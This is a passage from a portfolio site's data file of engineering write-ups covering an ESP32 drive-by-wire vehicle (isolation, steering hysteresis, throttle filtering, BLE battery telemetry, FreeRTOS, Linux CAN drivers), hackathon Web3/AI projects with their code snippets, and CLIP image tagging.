          'When testing the 5kW powertrain, 10–20 kHz PWM switching on the 72V traction rail caused inductive ground bounce (2–5V spikes) across the chassis, destroying development laptop USB ports and resetting low-voltage microcontrollers. Furthermore, an optocoupler on the motor Hall pulse wire failed to trigger because the controller\'s internal pull-up resistor (>4.7kΩ) limited current sourcing to under 1 mA.',
        type: 'mistake',
      },
      {
        heading: '2N2222A Transistor Gain & Relocating the Node',
        content:
          'We added a 2N2222A NPN transistor on the Hall line, allowing the <1mA signal to saturate the base and switch a clean 15mA pulse. Then we executed a major architectural shift: we moved the entire ESP32-C3 ECU into the motor enclosure, sharing a common ground reference with the 5kW controller.',
        callout:
          'Instead of isolating multiple analog throttle and Hall lines across the vehicle, we isolated the entire microcontroller node and crossed the barrier via isolated CAN.',
        type: 'breakthrough',
      },
      {
        heading: 'Transformer Air-Gap & ISO7721 CAN Isolation',
        content:
          'The ESP32-C3 was powered from the 12V LV battery through a B1205S-3W DC-DC converter with a 1.5 kV toroidal air gap. The only interface crossing back to the vehicle was the differential CAN bus, isolated via an ISO7721 dual-channel digital isolator.',
        type: 'lesson',
      },
    ],
    photo: {
      caption: 'Oscilloscope probing: Capturing inverter PWM ground bounce and verifying ISO7721 isolated CAN signal integrity.',
      location: 'Vehicle Powertrain Bay',
      timestamp: '11:20 PM',
    },
    metrics: [
      { label: 'Galvanic Barrier', value: '1.5 kV DC' },
      { label: 'Motor Power', value: '5 kW / 72V' },
      { label: 'Hall Drive', value: '<1mA → 15mA' },
    ],
    tags: ['B1205S-3W', 'ISO7721', '2N2222A', 'ESP32-C3', 'Ground Loop Isolation', '5kW Motor Node'],
    relatedProjectId: 'abhyuday-dbw',
  },
  {
    id: 'abaja-steer-hysteresis',
    title: 'Eliminating Steer-by-Wire Limit-Cycle Oscillation: Dual-Threshold Hysteresis & Scaled Overshoot',
    subtitle: 'How asymmetrical 10° engage and 5° disengage thresholds combined with scaled overshoot biasing stopped violent rack chattering',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'May – Jun 2026',
    readTime: '2 min read',
    badge: '0.00% Limit Cycle',
    storyType: 'deep-dive',
    summary:
      'Earlier Steer-by-Wire prototypes suffered from two severe control issues: violent limit-cycle chattering around 0° (the motor constantly toggled between left and right at high frequency due to a single 2.0° deadband), and high-angle stalls beyond 100° scrub friction. Forcing PWM 255 blew past targets by 20° and bounced violently. We solved this with Dual-Threshold Hysteresis (10° engage / 5° disengage) and a Scaled Overshoot Margin function with a decoupled postOvershootCorrection fine-tuning phase that scales speed strictly by remaining error.',
    theMistake:
      'Using a single symmetrical deadband threshold on a mechanical rack with backlash and rotor inertia, and coupling high-speed overrides to absolute steering angle instead of remaining error.',
    theLesson:
      'Symmetrical on/off thresholds in mechanical actuators with inertia inevitably produce limit cycles. Bang-bang control laws must incorporate hysteresis gaps, and high-torque boosts must disengage during error convergence.',
    sections: [
      {
        heading: 'Violent 0° Chatter & 100° Scrub Friction',
        content:
          'Around small angles (0° to 10°), the steering motor vibrated at 10–20 Hz as rotor inertia kicked the AS5600 magnetic encoder back and forth across the 2.0° deadband. Meanwhile, past 100° of steering angle, kingpin scrub friction stalled the motor at normal speed. When driven at PWM 255, momentum blew past the target and slammed back in reverse.',
        type: 'mistake',
      },
      {
        heading: 'Dual-Threshold Hysteresis & Biased Overshoot',
        content:
          'We implemented asymmetrical thresholds: DEADBAND_LOOSE = 10.0° (engage) and DEADBAND_TIGHT = 5.0° (disengage). The 5.0° gap completely stopped self-retriggering chatter. For angles >100°, the controller aims at a dynamic overshoot margin (min(15.0 + 0.25 × (Target - 100.0), 35.0°)).',
        callout:
          'Decoupling fine-correction speed from absolute angle prevented the motor from applying full 255 PWM when correcting a tiny 2° remaining error.',
        type: 'breakthrough',
      },
      {
        heading: 'Decoupled Fine-Correction Convergence',
        content:
          'Once the actuator reaches the biased overshoot target, the state machine transitions to postOvershootCorrection, scaling speed strictly by remaining error (PWM_SLOW = 150 for <=15°), eliminating bounce and achieving smooth holding at standstill.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Chatter at Rest', value: '0.00%' },
      { label: 'Engage Deadband', value: '10.0°' },
      { label: 'Disengage Deadband', value: '5.0°' },
    ],
    tags: ['Steer-by-Wire', 'AS5600', 'Hysteresis', 'FreeRTOS', 'Bang-Bang Control', 'aBAJA'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Dual-Threshold Hysteresis State Machine',
      language: 'cpp',
      code: `// Excerpt from: Abhyuday_DBW_2026/ESP32_Wroom/.../ESP32BangBangSBW.cpp
const float DEADBAND_TIGHT = 5.0;  // Disengage threshold
const float DEADBAND_LOOSE = 10.0; // Engage threshold

if (actuatorOn) {
  // Moving: stop only once inside tight deadband
  if (abs(travelError) <= DEADBAND_TIGHT) {
    stopActuator();
    postOvershootCorrection = false;
  } else {
    activePwmSpeed = computeSpeed(travelError, currentAngle);
    if (travelError > 0) steerRight(activePwmSpeed);
    else steerLeft(activePwmSpeed);
  }
} else {
  // Stopped: engage only when error exceeds loose deadband
  if (abs(travelError) > DEADBAND_LOOSE) {
    activePwmSpeed = computeSpeed(travelError, currentAngle);
    if (travelError > 0) steerRight(activePwmSpeed);
    else steerLeft(activePwmSpeed);
  }
}`,
    },
  },
  {
    id: 'abaja-throttle-ema-dac',
    title: 'The 50 RPM Quantization Step & Inverter Dead Zone: Signal Conditioning Evolution',
    subtitle: 'Smoothing 50 RPM staircases with an O(1) EMA filter and eliminating 25% pedal dead zone with MCP4725 split-domain mapping',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'May – Jun 2026',
    readTime: '2 min read',
    badge: '12-bit DAC · α=0.15 EMA',
    storyType: 'deep-dive',
    summary:
      'In 2025, counting 6 wheel pulses in 200ms windows caused speed telemetry to jump in harsh 50 RPM discrete steps (0, 50, 100 RPM), while inductive ringing breached the 100-cycle PCNT filter. Furthermore, the motor controller ignored all throttle voltages below 1.3V, causing a 25% dead zone on the pedal. In 2026, we maxed the hardware PCNT glitch filter to 1023 cycles, designed an O(1) Exponential Moving Average (EMAFilter, alpha=0.15), integrated a 12-bit MCP4725 I2C DAC with split-domain mapping (0.5V idle -> 1.3V-3.5V active range), and capped slew rate at 1.0 V/s.',
    theMistake:
      'Counting raw integer pulses in fixed time windows without analyzing quantization limits, and assuming motor controller analog inputs were linear starting from 0V.',
    theLesson:
      'Never rely on integer pulse counts without quantization analysis. Pair hardware glitch filtering with recursive exponential estimators, and characterize physical actuator threshold cutoffs to eliminate software dead zones.',
    sections: [
      {
        heading: '50 RPM Step Jumps and 1.3V Motor Dead Zone',
        content:
          'With 6 pulses per revolution and a 200 ms window, each individual pulse computed to exactly (1 / 0.200 / 6) × 60 = 50 RPM, creating stepped speed profiles. Meanwhile, the Datai motor controller ignored analog inputs below 1.3V, causing zero acceleration for the first 25% of pedal travel.',
        type: 'mistake',
      },
      {
        heading: 'Hardware PCNT Debounce & O(1) EMA Filter',
        content:
          'We set the ESP32 Pulse Counter glitch filter to its hardware ceiling (PCNT_FILTER_VALUE = 1023) to eliminate inductive ringing. We replaced array averages with an Exponential Moving Average (y[n] = 0.15 * x[n] + 0.85 * y[n-1]), transforming stepped staircases into smooth analog speed traces.',
        type: 'breakthrough',
      },
      {
        heading: 'Split-Domain MCP4725 Mapping & Slew Rate Limiting',
        content:
          'We integrated an external 12-bit MCP4725 I2C DAC: command 0 forces 0.5V safe idle, while commands 1–30 step immediately to 1.3V (DAC_ACTIVE_MIN) and scale linearly to 3.5V (DAC_ACTIVE_MAX). Voltage slew rate was locked to 1.0 V/s (0.01V / 10ms) to protect gearboxes from step over-current.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'DAC Resolution', value: '12-Bit (4096)' },
      { label: 'PCNT Filter', value: '1023 Cycles' },
      { label: 'Slew Rate', value: '1.0 V/s' },
    ],
    tags: ['ESP32 PCNT', 'MCP4725', 'EMA Filter', 'Signal Conditioning', 'Throttle-by-Wire'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Split Throttle Mapping & Exponential Filter',
      language: 'cpp',
      code: `// Excerpt from: DBW_final_2026/ESP32_FLASH/TBW.cpp
class EMAFilter {
  private:
    float alpha, currentEMA;
    bool initialized;
  public:
    EMAFilter(float factor) : alpha(factor), currentEMA(0.0f), initialized(false) {}
    float add(float val) {
      if (!initialized) { currentEMA = val; initialized = true; }
      else { currentEMA = (val * alpha) + (currentEMA * (1.0f - alpha)); }
      return currentEMA;
    }
};

float throttleToVoltage(int command) {
  if (command == 0) return DAC_IDLE_VOLTAGE; // 0.5V Safe Idle
  // 1-30 Command maps across 1.3V to 3.5V active range
  return DAC_ACTIVE_MIN + (((float)(command - 1) / 29.0f) * (DAC_ACTIVE_MAX - DAC_ACTIVE_MIN));
}`,
    },
  },
  {
    id: 'reverse-engineering-24s-bms',
    title: 'No Documentation, A Multimeter, and Wireshark: Reverse Engineering the 24S BMS',
    subtitle: 'Decoupled NimBLE scanning, 20-byte MTU defragmentation, and diagnosing a critical 49.18V deep discharge fault',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded', 'Cybersecurity & Systems'],
    date: 'May 2026',
    readTime: '2 min read',
    badge: 'Zero Docs Telemetry',
    storyType: 'deep-dive',
    summary:
      'To monitor our custom 24S Lithium-ion accumulator pack, we integrated an ESP32-C3 over BLE with a JBD/Xiaoxiang Smart BMS. We hit four roadblocks: scanning radio collision drops, suppressed writes due to writeNoResponse permission flags, an opcode typo (0x5A instead of 0xA5), and 20-byte BLE MTU packet fragmentation reporting garbage 654V voltages. Building a dynamic stream reassembly buffer (checking 0xDD start and 0x77 stop bytes) decoded the stream accurately, immediately revealing the pack was in a critical deep discharge state (49.18V total, ~2.04V/cell) with fault 0x000A.',
    theMistake:
      'Initially querying generic GATT characteristics and parsing structured structs directly from single 20-byte BLE notification packets without a framed stream reassembly buffer.',
    theLesson:
      'BLE notifications are packet-fragmented around 20-byte MTUs. When vendor documentation is nonexistent, capture raw packet traces and implement a framed stream reassembly state machine validating header, payload length, and termination bytes.',
    sections: [
      {
        heading: 'The 654V Garbage Telemetry & Error 0x81',
        content:
          'When querying the JBD BMS from an ESP32-C3, early code crashed: connecting inside the scan callback caused radio hardware contention, checking pChar->canWrite() failed because the BMS characteristic used writeNoResponse, and parsed pack voltage reported 654.07 V and 173% SOC.',
        type: 'mistake',
      },
      {
        heading: '20-Byte BLE MTU Defragmentation Buffer',
        content:
          'Standard BLE limits GATT notifications to a 20-byte Maximum Transmission Unit. The 34-byte BMS status frame was split across two packets. Parsing the raw struct from chunk 1 read uninitialized memory. We built a dynamic vector buffer assembling bytes between 0xDD start headers and 0x77 stop bytes.',
        callout:
          'Assembling stream fragments across 20-byte MTU boundaries restored 100% packet integrity.',
        type: 'breakthrough',
      },
      {
        heading: 'Diagnosing the 49.18V Under-Voltage Fault',
        content:
          'Accurate telemetry immediately decoded fault 0x000A: the 24S pack was deep-discharged at 49.18V (~2.04V/cell). Catching this prevented permanent lithium cell degradation and enabled recovery charging before track trials.',
        type: 'lesson',
      },
    ],
    photo: {
      caption: 'Wireshark packet capture: Mapping 0xDD start headers, payload lengths, and individual cell voltage registers.',
      location: 'Powertrain Lab',
      timestamp: '08:45 PM',
    },
    metrics: [
      { label: 'Cells Monitored', value: '24 Cells' },
      { label: 'Vendor Docs', value: '0 pages' },
      { label: 'Telemetry Stream', value: '<10 ms' },
    ],
    tags: ['BLE', 'NimBLE', 'JBD BMS', 'Packet Sniffing', 'Defragmentation', 'Lithium Pack'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Framed Stream Defragmentation Callback',
      language: 'cpp',
      code: `// Excerpt from: Abhyuday_DBW_2026/ESP32_C3/JBD_BMS_info_BT_to_Serial.cpp
std::vector<uint8_t> rxBuffer;

void notifyCallback(NimBLERemoteCharacteristic* pChar, uint8_t* pData, size_t length, bool isNotify) {
  rxBuffer.insert(rxBuffer.end(), pData, pData + length);
  while (rxBuffer.size() >= 7) {
    if (rxBuffer[0] != 0xDD) {
      rxBuffer.erase(rxBuffer.begin());
      continue;
    }
    uint8_t dataLen = rxBuffer[3];
    size_t totalExpectedLen = dataLen + 7;
    if (rxBuffer.size() < totalExpectedLen) return; // Await remaining fragment
    if (rxBuffer[totalExpectedLen - 1] == 0x77) {
      decodeBMSData(rxBuffer.data(), totalExpectedLen);
    }
    rxBuffer.erase(rxBuffer.begin(), rxBuffer.begin() + totalExpectedLen);
  }
}`,
    },
  },
  {
    id: 'abaja-freertos-multicore-pinning',
    title: 'Conquering Real-Time Jitter: Multi-Core FreeRTOS Task Pinning & Hardware Watchdogs',
    subtitle: 'How separating 100Hz I2C sensor acquisition onto Core 0 and deterministic CAN onto Core 1 cut jitter from >80ms to <2ms',
    category: 'Electronics & Embedded',
    categories: ['Electronics & Embedded'],
    date: 'May – Jun 2026',
    readTime: '2 min read',
    badge: '<2ms CAN Jitter',
    storyType: 'deep-dive',
    summary:
      'In 2025, executing sensor sampling, CAN frame handling, and motor PID inside a single loop() created severe jitter (timing delta varied between 20ms and 180ms) when ADC conversions or serial logging blocked the CPU. In 2026, we refactored the architecture into FreeRTOS tasks pinned across dual cores: Core 0 runs asynchronous 100Hz sensor sampling with strict I2C timeouts, while Core 1 runs deterministic CAN RX/TX tasks at 50Hz (vTaskDelayUntil) and motor actuation protected by mutexes, registered to a 2000ms Task Watchdog (TWDT).',
    theMistake:
      'Running time-critical automotive communication and blocking analog/I2C sensor reads sequentially in a single-threaded loop.',
    theLesson:
      'In embedded multi-core systems, decouple fast hardware communication from slow sensor I/O by pinning tasks to dedicated cores. Use thread-safe queues/mutexes and register every task to hardware task watchdogs.',
    sections: [
      {
        heading: 'The 20ms to 180ms Timing Jitter',
        content:
          'In single-threaded polling loops, serial prints, ADC conversions, and I2C transactions blocked the CPU. When an AS5600 magnetic encoder experienced I2C bus stalls, incoming CAN frames were dropped due to hardware FIFO overflow, causing erratic PID derivative spikes.',
        type: 'mistake',
      },
      {
        heading: 'Dual-Core Task Pinning Architecture',
        content:
          'We split workloads across ESP32 dual cores: Core 0 runs encoderTaskCode at 100 Hz with strict Wire.setTimeOut(20) bus timeouts. Core 1 runs canTxTask with vTaskDelayUntil at exact 20 ms (50 Hz) intervals and canRxTask draining TWAI queues without blocking.',
        type: 'breakthrough',
      },
      {
        heading: 'Hardware Task Watchdog Timer (TWDT)',
        content:
          'All tasks register to esp_task_wdt_add(NULL). If any sensor or communication thread hangs for >2000 ms, the hardware TWDT triggers an automated reboot, guaranteeing fail-safe recovery.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'CAN Jitter', value: '>80ms → <2ms' },
      { label: 'Sensor Loop', value: '100 Hz Locked' },
      { label: 'Task Watchdog', value: '2000 ms TWDT' },
    ],
    tags: ['FreeRTOS', 'ESP32 Dual-Core', 'Task Pinning', 'TWAI CAN', 'TWDT Watchdog'],
    relatedProjectId: 'abhyuday-dbw',
    snippet: {
      title: 'Dual-Core FreeRTOS Task Pinning',
      language: 'cpp',
      code: `// Excerpt from: Abhyuday_DBW_2026/DBW_final_2026/OTA/SBW.cpp
// Core 0: 100 Hz Sensor Acquisition
void encoderTaskCode(void *pvParameters) {
  esp_task_wdt_add(NULL);
  for(;;) {
    esp_task_wdt_reset();
    int currentRaw = encoder.readAngle();
    // Multi-turn unwrapping...
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

// Core 1: Jitter-Free 50 Hz CAN Broadcast
void canTxTask(void *pvParameters) {
  esp_task_wdt_add(NULL);
  TickType_t xLastWakeTime = xTaskGetTickCount();
  for(;;) {
    esp_task_wdt_reset();
    twai_transmit(&tx_msg, pdMS_TO_TICKS(5));
    vTaskDelayUntil(&xLastWakeTime, pdMS_TO_TICKS(20)); // Exact 50 Hz period
  }
}`,
    },
  },
  {
    id: 'abaja-fedora-kvaser-binding',
    title: 'The Linuxcan Kernel Header & USB Driver Binding Battle on Fedora 43',
    subtitle: 'Compiling Kvaser SocketCAN drivers on Linux 7.0 and resolving dynamic USB kernel module binding conflicts',
    category: 'Cybersecurity & Systems',
    categories: ['Cybersecurity & Systems', 'Electronics & Embedded'],
    date: 'May 2026',
    readTime: '2 min read',
    badge: 'Fedora 43 · Linux 7.0',
    storyType: 'deep-dive',
    summary:
      'Interfacing our development workstation with the 500 kbps vehicle CAN bus via a Kvaser USBcan Light adapter hit multiple obstacles on Fedora 43 (Linux kernel 7.0.8): missing kernel build directory paths under dnf5, UEFI Secure Boot signature rejection, and USB device auto-binding to the legacy \'leaf\' driver instead of SocketCAN \'kvaser_usb\'. We established an explicit KDIR compilation workflow, disabled MOK signature blocking, and scripted dynamic sysfs driver unbind/rebinding to bring up can0.',
    theMistake:
      'Assuming kernel headers and USB driver loading would bind to SocketCAN automatically on cutting-edge Linux kernel versions.',
    theLesson:
      'Kernel upgrades frequently alter module build paths and USB driver binding priorities. When a USB hardware interface appears in proprietary vendor utilities but fails to register in SocketCAN, inspect `/sys/bus/usb/drivers/` for mismatched kernel module bindings.',
    sections: [
      {
        heading: 'Kernel 7.0 Build Failures & Ghost Interfaces',
        content:
          'Building the Kvaser linuxcan driver on Fedora 43 failed with missing kernel directory paths. After fixing paths, modprobe kvcommon failed with key rejected by service due to UEFI Secure Boot MOK policy. Once loaded, ./listChannels showed the hardware, but ip link showed zero can0 SocketCAN interfaces.',
        type: 'mistake',
      },
      {
        heading: 'Targeted KDIR Build & Dynamic Sysfs Driver Rebinding',
        content:
          'We targeted the active kernel tree explicitly (make KDIR=/lib/modules/$(uname -r)/build) and disabled Secure Boot. Inspecting sysfs revealed the Linux USB subsystem had bound the adapter to the legacy leaf driver. We unbinded the USB device from leaf and rebound it to kvaser_usb via sysfs echo commands.',
        type: 'breakthrough',
      },
      {
        heading: '0.00% Packet Loss SocketCAN Bring-Up',
        content:
          'Once rebound, ip link set can0 type can bitrate 500000 && ip link set up can0 brought up the physical interface with 0.00% packet loss during full-bus playback.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Kernel Version', value: 'Linux 7.0.8' },
      { label: 'Bus Speed', value: '500 kbps' },
      { label: 'Packet Loss', value: '0.00%' },
    ],
    tags: ['Linux Kernel', 'Fedora 43', 'SocketCAN', 'Kvaser USBcan', 'Sysfs Rebinding'],
    relatedProjectId: 'abhyuday-dbw',
  },

  // ==========================================
  // 3. COTTONX & CHAINPILOT (AI & WEB3)
  // ==========================================
  {
    id: 'cottonx-cloud-monolith',
    title: 'The Cloud Migration: Collapsing Distributed AWS Queues into a Unified Container',
    subtitle: 'Replacing AWS API Gateway, Lambda, SQS, and Bedrock with Google Cloud Run, Gemini 1.5 Flash, and in-memory WebSockets',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3', 'AI & Computer Vision'],
    date: 'Apr 2026',
    readTime: '2 min read',
    badge: 'DevClash Pune',
    storyType: 'war-story',
    summary:
      'CottonX started on AWS serverless: API Gateway routing WebSockets to Lambda, pushing payloads to SQS, and workers calling Bedrock. Under hackathon deadlines, disconnected Lambdas dropped WebSocket sessions, SQS added 2-4s latency, and CDK quota limits blocked deployments. We collapsed the entire stack into a high-throughput Express container on Google Cloud Run: managed WebSockets in RAM (wsManager), migrated to Gemini 1.5 Flash and Firestore with a compatibility shim, and processed chat asynchronously in-process with zero cold-start latency.',
    theMistake:
      'Over-architecting a distributed multi-service AWS serverless queue for a real-time bi-directional AI streaming app during a 48-hour hackathon.',
    theLesson:
      'Serverless microservices add distributed state friction during rapid prototyping. For real-time, bi-directional AI streaming, a well-structured monolithic container with in-memory connection pooling outperforms distributed message queues in latency, reliability, and velocity.',
    sections: [
      {
        heading: 'WebSocket Cold Starts and SQS Delays',
        content:
          'Stateless Lambdas managing stateful WebSockets frequently lost active connections, and queue serialization introduced 2–4 second delays before AI agents streamed tokens. Multi-stack CDK deployments hit AWS Bedrock model quotas hours before judging.',
        type: 'mistake',
      },
      {
        heading: 'Unified Container Architecture on Cloud Run',
        content:
          'We collapsed API Gateway, Lambda, and SQS into a single Node.js container on Google Cloud Run. We built wsManager to hold client sockets in RAM, migrated to Gemini 1.5 Flash, and created a FirestoreChatStorage adapter with a DynamoDB v3 compatibility shim.',
        type: 'breakthrough',
      },
      {
        heading: 'Live Base Network Deployment',
        content:
          'In-process asynchronous chat dispatch eliminated queue hops, delivering instantaneous token streaming. During live demo judging, CottonX autonomously compiled and deployed verified smart contracts on Base network with zero hiccups.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Infra Complexity', value: '1 Container' },
      { label: 'Model', value: 'Gemini 1.5 Flash' },
      { label: 'Cold Starts', value: 'Zero ms' },
    ],
    tags: ['Google Cloud Run', 'Gemini API', 'WebSockets', 'Multi-Agent', 'Firestore', 'Node.js'],
    relatedProjectId: 'cottonx',
    snippet: {
      title: 'Gemini Agent Orchestrator',
      language: 'typescript',
      code: `// Excerpt from: CottonX/backend/src/lambda/queueChatExecutor.ts
export async function getOrchestrator(): Promise<MultiAgentOrchestrator> {
  const customClassifier = new GeminiClassifier({
    inferenceConfig: { maxTokens: 4000, temperature: 0, topP: 0.9 }
  });
  return new MultiAgentOrchestrator({
    storage: firestoreChatStorage,
    classifier: customClassifier as any,
    config: {
      USE_DEFAULT_AGENT_IF_NONE_IDENTIFIED: true,
      LOG_AGENT_CHAT: true,
      LOG_EXECUTION_TIMES: true,
    }
  });
}`,
    },
  },
  {
    id: 'cottonx-solidity-compilation',
    title: 'Browser-to-Chain Dynamic Solidity Compilation & Custom Contract Ingestion',
    subtitle: 'In-memory solc compilation, 10MB payload expansion, and pre-flight pragma validation for one-click MetaMask deployments',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3'],
    date: 'Apr 2026',
    readTime: '2 min read',
    badge: 'In-Memory solc',
    storyType: 'deep-dive',
    summary:
      'CottonX enables users to upload custom .sol smart contracts for AI validation and one-click deployment via MetaMask. Early builds crashed on malformed Solidity files missing pragma statements, and large OpenZeppelin contracts threw HTTP 413 Payload Too Large errors. We hardened the pipeline: expanded Express body parsing to 10MB, added pre-flight pragma verification, executed sandboxed in-memory compilation with solc, and stored verified ABIs and bytecodes directly in Firestore for frontend wallet factories.',
    theMistake:
      'Passing unvalidated raw Solidity strings to solc without schema wrappers, and relying on default 100KB Express body parser limits for compiled bytecode payloads.',
    theLesson:
      'When accepting user-generated smart contracts, perform strict pre-flight validation on the server, expand parser limits for large dependency trees, and persist normalized ABIs/bytecodes to insulate client wallet signers from compilation complexity.',
    sections: [
      {
        heading: '413 Payloads and Unhandled solc Panics',
        content:
          'User contracts importing OpenZeppelin libraries generated large compiled artifacts that breached Express\'s default 100KB JSON parser limit. Furthermore, missing pragma directives caused raw solc.compile() calls to panic.',
        type: 'mistake',
      },
      {
        heading: 'Pre-Flight Pragma Verification and 10MB Buffers',
        content:
          'We expanded Express body parsing to 10MB (express.json({ limit: "10mb" })) and added pre-flight regex checks for pragma solidity. The compiler runs sandboxed in memory, returning structured errors before touching the database.',
        type: 'breakthrough',
      },
      {
        heading: 'Seamless MetaMask Contract Factories',
        content:
          'Compiled ABIs, bytecodes, and compiler versions are stored directly in Firestore, allowing the frontend to instantiate ethers.ContractFactory in MetaMask without requiring local hardhat tools on user machines.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Payload Cap', value: '10 MB' },
      { label: 'Compilation', value: 'In-Memory' },
      { label: 'Networks', value: 'Base / Sepolia' },
    ],
    tags: ['Solidity', 'solc', 'Ethers.js', 'MetaMask', 'Smart Contracts', 'Web3'],
    relatedProjectId: 'cottonx',
    snippet: {
      title: 'Sandboxed Solidity Compilation Handler',
      language: 'typescript',
      code: `// Excerpt from: CottonX/backend/src/server.ts
app.post('/api/contracts/upload', async (req, res) => {
  const { userId, fileName, sourceCode, contractName } = req.body;
  if (!sourceCode.includes('pragma solidity') && !sourceCode.includes('pragma Solidity')) {
    return res.status(400).json({ success: false, error: 'Must contain pragma solidity.' });
  }
  const compiled = compileContract(sourceCode, contractName);
  if (!compiled.success) {
    return res.status(400).json({ success: false, error: 'Compilation failed', details: compiled.error });
  }
  const contractFile = await storeContractFile(userId, fileName, sourceCode, contractName);
  contractFile.abi = compiled.abi;
  contractFile.bytecode = compiled.bytecode;
  contractFile.compilerVersion = solc.version();
  res.json({ success: true, data: contractFile });
});`,
    },
  },
  {
    id: 'chainpilot-autonomous-worker',
    title: 'The Autonomous On-Chain Execution Worker: Non-Custodial Agent Lifecycle',
    subtitle: 'Decoupling condition evaluation from settlement with Promise.allSettled and enforcing strict 10 ETH / 5000 USDC guardrails',
    category: 'Web Dev & Web3',
    categories: ['Web Dev & Web3', 'AI & Computer Vision'],
    date: 'Apr 2026',
    readTime: '2 min read',
    badge: 'Non-Custodial Web3',
    storyType: 'deep-dive',
    summary:
      'In ChainPilot (DevClash Hackathon), users create autonomous agents using natural language (e.g., "Buy 50 USDC of ETH if price < 2500"). Early prototypes suffered from three flaws: slow RPC timeouts blocked the single-threaded polling loop for all users, flawed prompts risked draining wallet balances, and storing private keys on the backend posed catastrophic security risks. We decoupled the system: background workers evaluate conditions concurrently using Promise.allSettled(), validationService enforces strict token whitelists and hard transaction limits (10 ETH, 5000 USDC), and transaction settlement is prepared non-custodially via Ethers.js.',
    theMistake:
      'Iterating over active agents in a single synchronous loop and considering backend private key custody for autonomous automation.',
    theLesson:
      'Autonomous Web3 agents must never hold private keys directly on backend servers. Build systems where AI handles intent extraction, condition monitoring, and transaction compilation, while cryptographic authorization remains anchored in user-signed permits.',
    sections: [
      {
        heading: 'Synchronous Polling Lockups & Key Custody Risks',
        content:
          'Evaluating active agents in a single sequential for...of loop meant a single RPC endpoint timeout stalled evaluations for all users. Moreover, allowing unrestricted AI actions risked automated balance drains if a user prompt had flaws.',
        type: 'mistake',
      },
      {
        heading: 'Concurrent Promise.allSettled Worker',
        content:
          'We rebuilt executionService to evaluate active agent trigger conditions concurrently using Promise.allSettled(), isolating individual oracle network errors from peer tasks. Intent extraction in intentService uses few-shot LangChain templates with regex markdown fence stripping.',
        type: 'breakthrough',
      },
      {
        heading: 'Strict Financial Safety Caps & Non-Custodial Signing',
        content:
          'validationService validates tokens against a strict whitelist (ETH, USDC, WBTC, SOL) and enforces hard caps (10 ETH, 5000 USDC). Transactions are compiled via Ethers.js and broadcast only upon receiving user-signed authorization.',
        type: 'lesson',
      },
    ],
    metrics: [
      { label: 'Eval Interval', value: '<30 s' },
      { label: 'Safety Cap', value: '10 ETH / 5000 USDC' },
      { label: 'Key Custody', value: '0 Keys Stored' },
    ],
    tags: ['Ethers.js', 'LangChain', 'Gemini Pro', 'Non-Custodial', 'Web3 Execution', 'Smart Contracts'],
    relatedProjectId: 'chainpilot',
    snippet: {
      title: 'Agent Intent Validation Guardrails',
      language: 'javascript',
      code: `// Excerpt from: DevClash_GoblinGang/backend/services/validationService.js
const SUPPORTED_TOKENS = ["ETH", "USDC", "WBTC", "SOL"];
const LIMITS = { ETH: 10, USDC: 5000, WBTC: 0.1, SOL: 100 };

const validateIntent = (parsedIntent) => {
  const { trigger, condition, action } = parsedIntent;
  if (!trigger || !condition || !action) return { valid: false, error: "Incomplete structure." };
  const asset = action.asset?.toUpperCase();
  if (!SUPPORTED_TOKENS.includes(asset)) {
    return { valid: false, error: "Asset '" + asset + "' is not supported." };
  }
  if (action.amount <= 0 || (LIMITS[asset] && action.amount > LIMITS[asset])) {
    return { valid: false, error: "Amount exceeds safety limit of " + LIMITS[asset] + " " + asset };
  }
  return { valid: true };
};`,
    },
  },

  // ==========================================
  // 4. CYO IMAGE SEARCH FORENSIC STORIES
  // ==========================================
  {
    id: 'cyo-tag-contradiction',
    title: 'The Multi-Model Semantic Collision & The Tag Contradiction Resolution Engine',
    subtitle: 'Eliminating mutually contradictory CLIP zero-shot tags with dynamic 75th-percentile adaptive thresholds and ontology graphs',
    category: 'AI & Computer Vision',
    categories: ['AI & Computer Vision'],
    date: 'Jan – Mar 2026',
    readTime: '2 min read',
    badge: '94% False Positives Cut',
    storyType: 'deep-dive',
    summary:
      'CYO Image Search uses OpenAI CLIP ViT-L/14 for zero-shot classification across 250+ concepts. Early indexing produced bizarre contradictions: a beach photo was tagged with both \'daytime\' and \'night\', or \'bright\' and \'dark\', corrupting SQL tag intersection queries. We resolved this by replacing static thresholds with dynamic adaptive thresholding (75th percentile drop point bounded between 0.21 and 0.27), building an explicit contradiction conflict graph, enforcing descriptive priority rules for people/groups, and partitioning concepts into mutually exclusive sets.',
    theMistake:
      'Applying a fixed cosine similarity threshold across abstract visual concepts and assuming deep vision models have intrinsic physical common sense.',
    theLesson:
      'Zero-shot vision models are powerful feature extractors but lack physical common sense. High-precision semantic search requires pairing neural embeddings with deterministic ontological conflict graphs and distribution-aware thresholding.',
    sections: [
      {
        heading: 'Daytime and Night on the Same Beach',
        content:
          'Using a fixed 0.20 threshold on CLIP ViT-L/14 zero-shot tagging caused outdoor sunny photos to receive both daytime (0.24) and night (0.23) tags. Indian wedding photos were tagged with wedding ceremony, haldi, mehendi, and birthday party simultaneously, breaking SQL AND search filters.',
        type: 'mistake',
      },
      {
        heading: 'Dynamic 75th-Percentile Adaptive Thresholding',
        content:
          'We replaced static cutoffs with adaptive thresholding: analyzing the top 30 candidate scores per photo and calculating T_adaptive = max(0.21, min(0.27, Score_75% × 0.82)), dynamically flexing cutoffs to individual photo lighting and contrast.',
        type: 'breakthrough',
      },
      {
        heading: 'Explicit Contradiction Conflict Graph',
        content:
          'We created _remove_contradictions() in clip_service.py. If mutually exclusive tags appear (bright/dark, indoor/outdoor), only the highest scoring tag survives. Group tags (group of people) actively suppress generic singular tags (person), slashing false positives by 94%.',
        type: 'lesson',
      },
    ],
    metrics: [
